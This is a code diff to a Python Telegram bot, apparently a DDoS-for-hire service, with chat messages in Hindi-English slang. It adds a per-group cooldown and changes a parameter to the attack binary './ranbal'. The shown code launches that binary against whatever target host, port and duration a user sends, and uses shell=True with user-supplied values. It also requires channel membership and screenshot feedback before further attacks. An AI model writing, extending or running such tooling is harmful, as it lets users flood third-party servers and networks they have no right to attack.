@@ -4,6 +4,7 @@ import threading
 import os
 import signal
 import copy
+import time  # added for cooldown feature
 
 from keep_alive import keep_alive
 keep_alive()  # Yeh function bot ko active rakhega
@@ -26,6 +27,9 @@ attack_processes = {}
 # Attack Start Karne Wale User ko Track Karna
 attack_owners = {}
 
+# Cooldowns Dictionary (Sabke liye cooldown)
+cooldowns = {}  # cooldowns[chat_id] = time when cooldown ends
+
 # ✅ Function to check if user is a member of required channels
 def is_member(user_id):
     for channel in REQUIRED_CHANNELS:
@@ -46,12 +50,15 @@ def start_attack(target, port, duration, message):
         feedback_pending[user_id] = True  # ✅ Feedback required
         bot.reply_to(message, f"✅ Chudai started on {target}:{port} for {duration} seconds. \n Send FEEDBACK \n \n DDos Na lge ya use stop krna ho tab use /ruko")
 
-        attack_command = f"{os.path.abspath('./ranbal')} {target} {port} {duration} 11 200"
+        attack_command = f"{os.path.abspath('./ranbal')} {target} {port} {duration} 12 200"
         process = subprocess.Popen(attack_command, shell=True, preexec_fn=os.setsid)
 
         # ✅ Process track karo
         attack_processes[chat_id] = process
         attack_owners[chat_id] = user_id  
+
+        # Set cooldown for the user
+        cooldowns[chat_id] = time.time() + duration
 
         process.wait()
 
@@ -81,6 +88,15 @@ def handle_attack(message):
     if feedback_pending.get(user_id, False):
         bot.reply_to(message, "❌ Pehle apna feedback (SCREENSHOT) do, tabhi agla chudai kar sakte ho! 📸")
         return
+
+    # Cooldown check (sab users pe lage)
+    if chat_id in cooldowns:
+        remaining = int(cooldowns[chat_id] - time.time())
+        if remaining > 0:
+            bot.reply_to(message, f"⏳ Group cooldown chal raha hai! Wait for {remaining} seconds.")
+            return
+        else:
+            cooldowns.pop(chat_id)
 
     command_parts = message.text.split()
     if len(command_parts) != 4:
@@ -120,6 +136,7 @@ def stop_attack(message):
 
                 attack_processes.pop(chat_id, None)  # ✅ Process remove karo
                 attack_owners.pop(chat_id, None)  # ✅ Owner remove karo
+                cooldowns.pop(chat_id, None)  # ✅ Cooldown bhi hatao
 
             except Exception as e:
                 bot.reply_to(message, f"❌ Error stopping attack: {e}")
